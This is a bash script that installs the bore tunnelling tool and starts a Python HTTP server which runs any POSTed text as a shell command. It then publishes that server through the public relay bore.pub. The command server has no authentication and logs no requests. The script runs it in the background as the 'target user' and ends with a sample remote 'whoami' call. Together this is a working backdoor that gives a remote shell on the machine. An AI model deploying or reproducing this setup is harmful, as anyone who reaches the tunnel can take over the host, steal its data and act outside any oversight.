#!/usr/bin/env bash
# remote_agent_setup.sh
# Sets up a bore tunnel + Python command server for remote orchestration.
# Run as the target user (no root required). Both services run in the background.

set -euo pipefail

BORE_VERSION="v0.6.0"
BORE_URL="https://github.com/ekzhang/bore/releases/download/${BORE_VERSION}/bore-${BORE_VERSION}-x86_64-unknown-linux-musl.tar.gz"
SERVER_PORT=9000
BORE_LOG="${HOME}/.local/bore-tunnel.log"

# ── Install bore (skip if already present) ────────────────────────────────────
mkdir -p "${HOME}/.local/bin"
export PATH="${HOME}/.local/bin:${PATH}"

if ! command -v bore &>/dev/null; then
    echo ">>> Installing bore ${BORE_VERSION}..."
    curl -fsSL "${BORE_URL}" | tar -xz -C "${HOME}/.local/bin/"
    echo "    bore installed to ~/.local/bin/bore"
fi

# ── Kill any previous instances ───────────────────────────────────────────────
set +e
pkill -f "bore local ${SERVER_PORT}" 2>/dev/null || true
pkill -f "cmd_server.py"             2>/dev/null || true
# Kill whatever is holding the port (works without root)
fuser -k "${SERVER_PORT}/tcp" 2>/dev/null || true
sleep 1

# ── Write Python command server to temp file and background it ────────────────
echo ">>> Starting command server on port ${SERVER_PORT}..."
cat > /tmp/cmd_server.py << 'PYEOF'
import http.server, subprocess, json, os

class CommandHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        cmd = self.rfile.read(length).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        body = json.dumps({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "rc":     result.returncode,
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass

http.server.HTTPServer(("127.0.0.1", 9000), CommandHandler).serve_forever()
PYEOF

SERVER_LOG="/tmp/cmd_server.log"
python3 /tmp/cmd_server.py >"${SERVER_LOG}" 2>&1 &
SERVER_PID=$!
sleep 2

if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
    echo "ERROR: Command server failed to start. Log:" >&2
    cat "${SERVER_LOG}" >&2
    exit 1
fi
echo "    Server PID: ${SERVER_PID} — OK"

# ── Start bore in background, capture port from log ───────────────────────────
echo ">>> Starting bore tunnel (logging to ${BORE_LOG})..."
bore local "${SERVER_PORT}" --to bore.pub >"${BORE_LOG}" 2>&1 &
BORE_PID=$!

# Wait for bore to print the port (up to 10s)
for i in $(seq 1 20); do
    if grep -q "listening at" "${BORE_LOG}" 2>/dev/null; then
        break
    fi
    sleep 0.5
done

if ! kill -0 "${BORE_PID}" 2>/dev/null; then
    echo "ERROR: bore failed to start. Log:" >&2
    cat "${BORE_LOG}" >&2
    exit 1
fi

BORE_PORT=$(grep -oP '(?<=bore\.pub:)\d+' "${BORE_LOG}")
echo "    bore PID: ${BORE_PID} — OK"
echo ""
echo "=========================================="
echo "  Remote agent ready."
echo "  Orchestrator endpoint: bore.pub:${BORE_PORT}"
echo "=========================================="
echo ""
echo "  Test with:"
echo "  curl -s -X POST http://bore.pub:${BORE_PORT} -d 'whoami'"
